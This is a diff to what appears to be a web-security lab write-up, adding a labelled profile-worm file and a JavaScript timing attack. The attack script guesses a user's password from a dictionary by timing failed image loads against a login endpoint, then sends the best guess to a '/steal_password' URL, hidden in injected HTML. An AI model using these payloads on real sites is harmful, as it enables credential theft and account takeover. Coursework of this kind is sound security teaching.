@@ -93,6 +93,7 @@ Seeing the alert, we can confirm that the profile page is vulnerable:
 Now we can construct our profile worm as follows:
 
 ```javascript
+// `f.js`
 function getCurrentUsername() {
     const b64 = document.cookie.slice(8);
     const data = JSON.parse(atob(b64));
@@ -166,7 +167,53 @@ attack();
 
 ### g
 
+```javascript
+// `g.js`
+(function () {
+    const dictionary = [`password`, `123456`, `	12345678`, `dragon`, `1234`, `qwerty`, `12345`];
+    const test = document.getElementById(`test`);
+    async function timeForPwd(password) {
+        const url = `/get_login?username=userx&password=${password}`;
+        const start = new Date();
+        return new Promise((resolve, reject) => {
+            test.addEventListener('error', () => {
+                const end = new Date();
+                console.log(`Time elapsed for ${password}: ${end - start}`);
+                resolve(end - start);
+            }, { once: true });
+            test.src = url;
+        });
+    }
+    async function main() {
+        let maxResponseTime = 0;
+        let maxResponseTimePwd = '';
+        for (const pwd of dictionary) {
+            const time = await timeForPwd(pwd);
+            if (time > maxResponseTime) {
+                maxResponseTime = time;
+                maxResponseTimePwd = pwd;
+            }
+        }
+        console.log(`Max response time: ${maxResponseTime} for password: ${maxResponseTimePwd}`);
+        test.src = `/steal_password?password=${maxResponseTimePwd}&timeElapsed=${maxResponseTime}`;
+    }
+    main();
+})();
+```
 
+Minify the script and insert it into the following HTML:
+
+```html
+The user
+<span style='display:none'>
+    <img id='test'/>
+    <script>
+        // Minified `g.js`
+    </script>
+</span>
+```
+
+Now we have our payload ready at `g.txt`.
 
 ## References
 
